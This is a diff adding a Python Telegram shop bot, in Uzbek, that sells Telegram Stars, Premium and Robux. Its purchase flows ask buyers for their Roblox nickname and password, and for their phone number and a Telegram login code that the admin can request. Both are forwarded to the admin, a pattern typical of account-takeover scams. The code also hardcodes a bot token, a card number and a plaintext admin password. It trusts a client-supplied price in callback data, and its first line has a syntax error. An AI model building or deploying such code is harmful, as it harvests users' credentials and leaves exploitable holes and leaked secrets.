@@ -1,0 +1,326 @@
+Import asyncio, json, os, time
+from aiogram import Bot, Dispatcher, F
+from aiogram.client.default import DefaultBotProperties
+from aiogram.filters import Command, CommandStart
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.types import InlineKeyboardMarkup as IKM, InlineKeyboardButton as IKB, ReplyKeyboardMarkup as RKM, KeyboardButton as KB, Message, CallbackQuery, FSInputFile
+
+T, AID, AUN, RCH = "8779396683:AAH5azJbZcbD3_aAIXGWQ8lEHdM7yL8jthc", 8527026238, "@VENOX_Uz1", "@VENOXUz_chati"
+CNUM, CPH, DB, PDB, APWD = "5614 6830 1549 1525", "+998701237388", "users_db.json", "promos.json", "robux2012"
+CMID, CSID = "Sizning_Merchant_ID", "Sizning_Service_ID"
+
+ord_map, w_codes, a_auth, sales = {}, set(), set(), {}
+
+class FSM(StatesGroup): item, chk, pwd, pay, prm = State(), State(), State(), State(), State()
+
+STARS = {"100":{"price":26120,"stock":50},"150":{"price":37880,"stock":30},"250":{"price":62360,"stock":20},"350":{"price":86960,"stock":15},"500":{"price":122840,"stock":10},"750":{"price":184880,"stock":8},"1000":{"price":247040,"stock":5},"1500":{"price":394040,"stock":4},"2500":{"price":622760,"stock":3},"5000":{"price":1210760,"stock":2},"10000":{"price":2419640,"stock":1}}
+PREM = {"1m":{"price":45000,"stock":20},"3m":{"price":182000,"stock":15},"6m":{"price":240000,"stock":10},"1y":{"price":300000,"stock":5}}
+ROB = {"40":{"price":11000,"stock":100},"80":{"price":15000,"stock":80},"120":{"price":25000,"stock":60},"160":{"price":29000,"stock":50},"200":{"price":38000,"stock":40},"240":{"price":44000,"stock":30},"280":{"price":53000,"stock":25},"320":{"price":59000,"stock":20},"360":{"price":64000,"stock":15},"500":{"price":68000,"stock":12},"540":{"price":75000,"stock":10},"580":{"price":83000,"stock":8},"620":{"price":89000,"stock":7},"660":{"price":97000,"stock":6},"700":{"price":107000,"stock":5},"740":{"price":111000,"stock":4},"780":{"price":121000,"stock":3},"1000":{"price":136000,"stock":2}}
+
+bot = Bot(token=T, default_bot_properties=DefaultBotProperties(parse_mode=None))
+dp = Dispatcher(storage=MemoryStorage())
+
+def ldb(fn=DB): return json.load(open(fn, "r", encoding="utf-8")) if os.path.exists(fn) else {}
+def sdb(d, fn=DB): json.dump(d, open(fn, "w", encoding="utf-8"), indent=2, ensure_ascii=False)
+def chk_u(uid):
+    db, u = ldb(), str(uid)
+    if u not in db: db[u] = {"balance": 0, "blocked": False}; sdb(db)
+def g_u(uid): return ldb().get(str(uid), {"balance": 0, "blocked": False})
+def add_b(uid, amt):
+    db, u = ldb(), str(uid)
+    db.setdefault(u, {"balance": 0, "blocked": False})
+    db[u]["balance"] += amt; sdb(db)
+    return db[u]["balance"]
+def f_n(v): return f"{v:,}".replace(",", " ")
+def g_p(cat, key, op):
+    if (cat, key) in sales:
+        s = sales[(cat, key)]
+        if time.time() < s["exp"]: return int(op * (100 - s["disc"]) / 100), s["disc"]
+        else: del sales[(cat, key)]
+    return op, 0
+
+m_kb = RKM(keyboard=[[KB(text="⭐ Stars olish"), KB(text="💎 Premium olish")],[KB(text="⚡ Robux olish")],[KB(text="⚡ Maxsus Chegirmalar"), KB(text="💳 Balans to'ldirish")],[KB(text="👤 Hisobim"), KB(text="🎟 Promokod")],[KB(text="📖 Qo'llanma"), KB(text="👑 Admin Panel")]], resize_keyboard=True, persistent=True)
+i_kb = lambda: IKM(inline_keyboard=[[IKB(text="⭐ Stars", callback_data="m_s"), IKB(text="💎 Premium", callback_data="m_p")],[IKB(text="⚡ Robux", callback_data="m_r")],[IKB(text="🔥 Flash Sale", callback_data="m_f")],[IKB(text="💳 Balans to'ldirish", callback_data="m_fl"), IKB(text="👤 Hisobim", callback_data="m_pr")]])
+
+def menu(items, pref, flag=False):
+    kb, cat = [], "stars" if "stars" in pref else ("prem" if "prem" in pref else "robux")
+    for k, v in items.items():
+        s, p = v["stock"], v["price"]
+        fp, disc = g_p(cat, k, p)
+        if s > 0:
+            mn = {'1m':'1 oylik','3m':'3 oylik','6m':'6 oylik','1y':'1 yillik'}.get(k, k)
+            ds = f" 🔥 -{disc}%" if disc > 0 else ""
+            lbl = f"⚡ {k} R$ — {f_n(fp)} so'm{ds} (📦 {s})" if flag else (f"⭐ {f_n(int(k))} yulduz — {f_n(fp)} so'm{ds} (📦 {s})" if "stars" in pref else f"💎 Premium {mn} — {f_n(fp)} so'm{ds} (📦 {s})")
+            kb.append([IKB(text=lbl, callback_data=f"{pref}_{k}_{fp}")])
+        else: kb.append([IKB(text=f"❌ {k} — Yo'q", callback_data=f"no_{k}")])
+    return IKM(inline_keyboard=kb + [[IKB(text="🔙 Orqaga", callback_data="back")]])
+
+@dp.callback_query(F.data.startswith("no_"))
+async def ns(c: CallbackQuery): await c.answer("❌ Vaqtincha yo'q!", show_alert=True)
+
+@dp.message(CommandStart())
+async def start(m: Message, state: FSMContext):
+    await state.clear(); u = m.from_user; chk_u(u.id)
+    if g_u(u.id).get("blocked", False) and u.id != AID: return await m.answer("❌ Bloklangansiz!")
+    await m.answer(f"Assalomu alaykum, {u.first_name}!", reply_markup=m_kb)
+    await m.answer("👇 Menyu:", reply_markup=i_kb())
+
+async def prof(t, u):
+    msg = f"👤 Profil:\n🆔 ID: {u.id}\n💰 Balans: {f_n(g_u(u.id)['balance'])} so'm"
+    await (t.answer(msg) if isinstance(t, Message) else t.message.answer(msg))
+    if not isinstance(t, Message): await t.answer()
+
+async def pay_menu(t, u):
+    msg = f"💳 Karta: {CNUM}\n📞 Tel: {CPH}\n👤 Admin: {AUN}"
+    kb = IKM(inline_keyboard=[[IKB(text="💳 Click", callback_data="p_cl")], [IKB(text="📸 Chek", callback_data="c_st")], [IKB(text="🔙 Orqaga", callback_data="back")]])
+    await (t.answer(msg, reply_markup=kb) if isinstance(t, Message) else t.message.answer(msg, reply_markup=kb))
+    if not isinstance(t, Message): await t.answer()
+
+@dp.callback_query(F.data == "p_cl")
+async def p_click(c: CallbackQuery, state: FSMContext): await state.set_state(FSM.pay); await c.message.answer("✍️ Summani kiriting:"); await c.answer()
+
+@dp.message(FSM.pay)
+async def pr_pay(m: Message, state: FSMContext):
+    if not m.text.isdigit(): return await m.answer("❌ Faqat raqam!")
+    amt = int(m.text)
+    if amt < 1000: return await m.answer("❌ Min: 1 000 so'm")
+    await state.clear()
+    url = f"https://my.click.uz/services/pay?service_id={CSID}&merchant_id={CMID}&amount={amt}&transaction_param={m.from_user.id}"
+    await m.answer(f"💳 Summa: {f_n(amt)} so'm", reply_markup=IKM(inline_keyboard=[[IKB(text="💳 O'tish", url=url)], [IKB(text="🔙 Orqaga", callback_data="back")]]))
+
+@dp.callback_query(F.data == "c_st")
+async def c_st(c: CallbackQuery, state: FSMContext): await state.set_state(FSM.chk); await c.message.answer("📸 Chek rasmini yuboring:"); await c.answer()
+
+@dp.message(FSM.chk, F.photo)
+async def r_chk(m: Message, state: FSMContext):
+    await state.clear(); u = m.from_user
+    await m.answer("✅ Chek yuborildi!")
+    try: await bot.send_photo(AID, photo=m.photo[-1].file_id, caption=f"📥 CHEK!\n👤 {u.full_name}\n🆔 {u.id}\n\n/send {u.id} 100000")
+    except: pass
+
+@dp.message(FSM.pwd)
+async def p_pwd(m: Message, state: FSMContext):
+    await state.clear()
+    if m.text.strip() == APWD:
+        a_auth.add(m.from_user.id)
+        await m.answer("👑 Admin Panel faol! /flash, /sales, /offsale, /stat, /send, /take, /mkcode, /promos, /user, /msg, /stock, /price, /bc, /block, /unblock")
+    else: await m.answer("❌ Parol xato!")
+
+@dp.message(FSM.prm)
+async def p_use(m: Message, state: FSMContext):
+    await state.clear(); code = m.text.strip(); uid = str(m.from_user.id); pdb = ldb(PDB)
+    if code in pdb:
+        p = pdb[code]
+        if p["limit"] <= 0: return await m.answer("❌ Limit tugagan!")
+        if uid in p["used_users"]: return await m.answer("❌ Ishlatgansiz!")
+        p["limit"] -= 1; p["used_users"].append(uid); sdb(pdb, PDB)
+        nb = add_b(m.from_user.id, p["amount"])
+        await m.answer(f"🎉 +{f_n(p['amount'])} so'm qo'shildi!\n💳 Balans: {f_n(nb)}")
+        notif = f"🎟 Kod ishlatildi!\n👤 {m.from_user.full_name}\n🎁 {code} (+{f_n(p['amount'])})"
+        try: await bot.send_message(AID, notif); await bot.send_message(RCH, notif)
+        except: pass
+    else: await m.answer("❌ Noto'g'ri kod!")
+
+@dp.message(FSM.item)
+async def r_item(m: Message, state: FSMContext):
+    d = await state.get_data(); iname, price, cat, key = d["iname"], d["price"], d["cat"], d["key"]
+    u = m.from_user
+    if g_u(u.id).get("balance", 0) < price: await state.clear(); return await m.answer("❌ Balans yetarli emas!")
+    td = STARS if cat == "stars" else (PREM if cat == "prem" else ROB)
+    if key in td and td[key]["stock"] > 0: td[key]["stock"] -= 1
+    nb = add_b(u.id, -price); await state.clear()
+    await m.answer(f"✅ Qabul qilindi!\n📦 {iname}\n💵 Yechildi: {f_n(price)}\n💳 Balans: {f_n(nb)}")
+    ord_map[u.id] = iname
+    akb = IKM(inline_keyboard=[[IKB(text="📥 Kod so'rash", callback_data=f"ask_{u.id}")], [IKB(text="✅ Bajarildi", callback_data=f"ord_{u.id}")]]) if "Premium" in iname else IKM(inline_keyboard=[[IKB(text="✅ Bajarildi", callback_data=f"ord_{u.id}")]])
+    try: await bot.send_message(AID, f"🔔 BUYURTMA!\n👤 {u.full_name}\n🆔 {u.id}\n🛒 {iname} ({f_n(price)})\n\nInfo:\n{m.text}", reply_markup=akb)
+    except: pass
+
+@dp.message(F.text & ~F.text.startswith("/"))
+async def text_h(m: Message, state: FSMContext):
+    uid = m.from_user.id
+    if g_u(uid).get("blocked", False) and uid != AID: return await m.answer("❌ Bloklangansiz!")
+    if m.reply_to_message and (uid == AID or uid in a_auth) and "🆔" in m.reply_to_message.text:
+        try:
+            tid = int([x for x in m.reply_to_message.text.split() if x.isdigit()][0])
+            await bot.send_message(tid, f"📞 Admin:\n\n{m.text}"); return await m.answer("✅ Yuborildi!")
+        except: pass
+    if uid in w_codes:
+        w_codes.remove(uid); await m.answer("✅ Yuborildi!")
+        try: await bot.send_message(AID, f"🔑 Kod ({m.from_user.full_name}): {m.text.strip()}")
+        except: pass
+        return
+    t = m.text.lower()
+    if "admin panel" in t: await state.set_state(FSM.pwd); return await m.answer("🔐 Parol:")
+    if "promokod" in t: await state.set_state(FSM.prm); return await m.answer("🎟 Kodni kiriting:")
+    if "chegirma" in t or "flash" in t:
+        txt, has, now = "🔥 Chegirmalar:\n\n", False, time.time()
+        for (c, k), v in list(sales.items()):
+            if now < v["exp"]: has = True; txt += f"⚡ {c.upper()} {k} — {v['disc']}% (⏳ {int((v['exp']-now)/60)}m)\n"
+            else: del sales[(c, k)]
+        return await m.answer(txt if has else "🔥 Hozircha yo'q!", reply_markup=i_kb())
+    chk_u(uid)
+    if "star" in t: await m.answer("⭐ Yulduz:", reply_markup=menu(STARS, "buy_s"))
+    elif "prem" in t: await m.answer("💎 Premium:", reply_markup=menu(PREM, "buy_p"))
+    elif "robux" in t: await m.answer("⚡ Robux:", reply_markup=menu(ROB, "buy_r", True))
+    elif "balans" in t or "to'ldirish" in t: await pay_menu(m, m.from_user)
+    elif "hisob" in t or "profil" in t: await prof(m, m.from_user)
+    elif "qo'llanma" in t: await m.answer("📖 Balansni to'ldirib xarid qiling.")
+    elif "admin" in t: await m.answer(f"📞 Admin: {AUN}")
+
+@dp.callback_query(F.data.startswith("m_"))
+async def cb_m(c: CallbackQuery):
+    d = c.data
+    if d == "m_s": await c.message.answer("⭐ Yulduz:", reply_markup=menu(STARS, "buy_s"))
+    elif d == "m_p": await c.message.answer("💎 Premium:", reply_markup=menu(PREM, "buy_p"))
+    elif d == "m_r": await c.message.answer("⚡ Robux:", reply_markup=menu(ROB, "buy_r", True))
+    elif d == "m_f":
+        now, txt, has = time.time(), "🔥 Chegirmalar:\n\n", False
+        for (c_name, k), v in list(sales.items()):
+            if now < v["exp"]: has = True; txt += f"⚡ {c_name.upper()} {k} — {v['disc']}% (⏳ {int((v['exp']-now)/60)}m)\n"
+            else: del sales[(c_name, k)]
+        await c.message.answer(txt if has else "🔥 Hozircha yo'q!", reply_markup=i_kb())
+    elif d == "m_fl": await pay_menu(c, c.from_user)
+    elif d == "m_pr": await prof(c, c.from_user)
+    await c.answer()
+
+@dp.callback_query(F.data == "back")
+async def cb_back(c: CallbackQuery, state: FSMContext): await state.clear(); await c.message.delete(); await c.message.answer("👇 Menyu:", reply_markup=i_kb())
+
+@dp.callback_query(F.data.startswith("buy_"))
+async def cb_buy(c: CallbackQuery, state: FSMContext):
+    p = c.data.split("_"); act, val, price = p[1], p[2], int(p[3])
+    if act == "s": txt, iname, cat = f"⭐ {val} yulduz ({f_n(price)}). Username yuboring:", f"⭐ {val} yulduz", "stars"
+    elif act == "p": txt, iname, cat = f"💎 Premium {val} ({f_n(price)}). Tel yuboring:", f"💎 Premium ({val})", "prem"
+    else: txt, iname, cat = f"⚡ {val} Robux ({f_n(price)}). Nik va parol yuboring:", f"⚡ {val} Robux", "robux"
+    await state.update_data(iname=iname, price=price, cat=cat, key=val)
+    await state.set_state(FSM.item); await c.message.edit_text(txt)
+
+@dp.callback_query(F.data.startswith("ask_"))
+async def cb_ask(c: CallbackQuery):
+    if c.from_user.id in (AID, *a_auth):
+        uid = int(c.data.split("_")[1]); w_codes.add(uid)
+        try: await bot.send_message(uid, "📲 Kod so'raldi!"); await c.answer("✅ So'raldi!")
+        except: pass
+
+@dp.callback_query(F.data.startswith("ord_"))
+async def cb_ord(c: CallbackQuery):
+    if c.from_user.id in (AID, *a_auth):
+        uid = int(c.data.split("_")[1]); iname = ord_map.get(uid, "Mahsulot")
+        try: await bot.send_message(uid, f"🎉 {iname} bajarildi!"); await c.message.edit_text(f"✅ Bajarildi!\n\n{c.message.text}"); await c.answer("✅ Ok")
+        except: pass
+
+@dp.message(Command("flash"))
+async def c_flash(m: Message):
+    if m.from_user.id not in (AID, *a_auth): return
+    p = m.text.split()
+    if len(p) < 5 or not p[3].isdigit() or not p[4].isdigit(): return await m.answer("❌ /flash CAT KEY FOIZ MINUT")
+    c, k, disc, mins = p[1].lower(), p[2], int(p[3]), int(p[4])
+    sales[(c, k)] = {"disc": disc, "exp": time.time() + (mins * 60)}
+    msg = f"🔥 FLASH SALE!\n📦 {c.upper()} - {k}\n🎉 -{disc}%\n⏳ {mins} min"
+    await m.answer(f"✅ Yoqildi!\n\n{msg}")
+    try: await bot.send_message(RCH, f"⚡ SHOSHILING!\n\n{msg}")
+    except: pass
+
+@dp.message(Command("sales"))
+async def c_sales(m: Message):
+    if m.from_user.id not in (AID, *a_auth): return
+    now, txt, has = time.time(), "🔥 Faol chegirmalar:\n\n", False
+    for (c, k), v in list(sales.items()):
+        if now < v["exp"]: has = True; txt += f"• {c.upper()} {k} -> -{v['disc']}% (⏳ {int((v['exp']-now)/60)}m)\n"
+        else: del sales[(c, k)]
+    await m.answer(txt if has else "❌ Yo'q.")
+
+@dp.message(Command("offsale"))
+async def c_offs(m: Message):
+    if m.from_user.id in (AID, *a_auth): sales.clear(); await m.answer("✅ O'chirildi!")
+
+@dp.message(Command("mkcode"))
+async def c_mk(m: Message):
+    if m.from_user.id not in (AID, *a_auth): return
+    p = m.text.split()
+    if len(p) < 4 or not p[2].isdigit() or not p[3].isdigit(): return await m.answer("❌ /mkcode KOD SUMMA SONI")
+    pdb = ldb(PDB); pdb[p[1]] = {"amount": int(p[2]), "limit": int(p[3]), "used_users": []}; sdb(pdb, PDB)
+    await m.answer(f"🎟 Yaratildi: {p[1]} ({f_n(int(p[2]))} so'm)")
+
+@dp.message(Command("promos"))
+async def c_promos(m: Message):
+    if m.from_user.id not in (AID, *a_auth): return
+    pdb = ldb(PDB)
+    if not pdb: return await m.answer("🎟 Promokodlar yo'q.")
+    txt = "🎟 Promokodlar:\n\n"
+    for code, v in pdb.items():
+        txt += f"🔑 {code} | 💰 {f_n(v.get('amount', 0))} | 👥 {len(v.get('used_users', []))} ta | 📉 Qoldi: {v.get('limit', 0)}\n"
+    await m.answer(txt)
+
+@dp.message(Command("stock", "price"))
+async def c_sp(m: Message):
+    if m.from_user.id not in (AID, *a_auth): return
+    a = m.text.split(); cmd = a[0][1:]
+    if len(a) < 4 or not a[3].isdigit(): return await m.answer(f"❌ /{cmd} cat key val")
+    td = STARS if a[1].lower()=="stars" else (PREM if a[1].lower()=="prem" else ROB)
+    if not td or a[2] not in td: return await m.answer("❌ Topilmadi!")
+    td[a[2]]["stock" if cmd=="stock" else "price"] = int(a[3]); await m.answer("✅ Yangilandi!")
+
+@dp.message(Command("take", "send"))
+async def c_ts(m: Message):
+    if m.from_user.id not in (AID, *a_auth): return
+    n = [x for x in m.text.split() if x.isdigit()]; cmd = m.text.split()[0][1:]
+    if len(n) < 2: return await m.answer(f"❌ /{cmd} ID SUMMA")
+    nb = add_b(int(n[0]), -int(n[1]) if cmd=="take" else int(n[1]))
+    if cmd == "send":
+        try: await bot.send_message(int(n[0]), f"✅ Balansga +{f_n(int(n[1]))} so'm qo'shildi!")
+        except: pass
+    await m.answer(f"✅ Bajarildi! Balans: {f_n(nb)}")
+
+@dp.message(Command("user"))
+async def c_u(m: Message):
+    if m.from_user.id not in (AID, *a_auth): return
+    n = [x for x in m.text.split() if x.isdigit()]
+    if not n: return await m.answer("❌ /user ID")
+    u = g_u(n[0]); await m.answer(f"👤 ID: {n[0]}\n💰 Balans: {f_n(u['balance'])}\n🚫 Blok: {u.get('blocked', False)}")
+
+@dp.message(Command("msg"))
+async def c_msg(m: Message):
+    if m.from_user.id not in (AID, *a_auth): return
+    p = m.text.split(maxsplit=2)
+    if len(p) < 3 or not p[1].isdigit(): return await m.answer("❌ /msg ID Xabar")
+    try: await bot.send_message(int(p[1]), f"📩 Admin xabari:\n\n{p[2]}"); await m.answer("✅ Yuborildi!")
+    except Exception as e: await m.answer(f"❌ Xato: {e}")
+
+@dp.message(Command("getdb"))
+async def c_getdb(m: Message):
+    if m.from_user.id in (AID, *a_auth) and os.path.exists(DB): await m.answer_document(FSInputFile(DB), caption="📁 Baza!")
+
+@dp.message(Command("block", "unblock"))
+async def c_bu(m: Message):
+    if m.from_user.id not in (AID, *a_auth): return
+    a = m.text.split(); cmd = a[0][1:]
+    if len(a) < 2 or not a[1].isdigit(): return await m.answer(f"❌ /{cmd} ID")
+    db = ldb()
+    if a[1] in db: db[a[1]]["blocked"] = (cmd == "block"); sdb(db); await m.answer("✅ Bajarildi!")
+    else: await m.answer("❌ Topilmadi.")
+
+@dp.message(Command("stat"))
+async def c_stat(m: Message):
+    if m.from_user.id not in (AID, *a_auth): return
+    db = ldb(); u = list(db.keys()); tb = sum(db[k].get("balance", 0) for k in u if isinstance(db[k], dict))
+    await m.answer(f"📊 Statistika:\n👤 Userlar: {len(u)} ta\n🚫 Blok: {sum(1 for k in u if isinstance(db[k], dict) and db[k].get('blocked'))} ta\n💰 Jami balans: {f_n(tb)} so'm")
+
+@dp.message(Command("bc"))
+async def c_bc(m: Message):
+    if m.from_user.id not in (AID, *a_auth): return
+    t = m.text.replace("/bc", "", 1).strip()
+    if not t: return await m.answer("❌ /bc Xabar")
+    c, f = 0, 0
+    for u in ldb():
+        try: await bot.send_message(int(u), t); c += 1; await asyncio.sleep(0.03)
+        except: f += 1
+    await m.answer(f"📢 Natija:\n✅ Yuborildi: {c}\n❌ Xato: {f}")
+
+async def main():
+    print("🔥 Bot ishga tushdi!")
+    await bot.delete_webhook(drop_pending_updates=True); await dp.start_polling(bot)
+
+if __name__ == "__main__": asyncio.run(main())
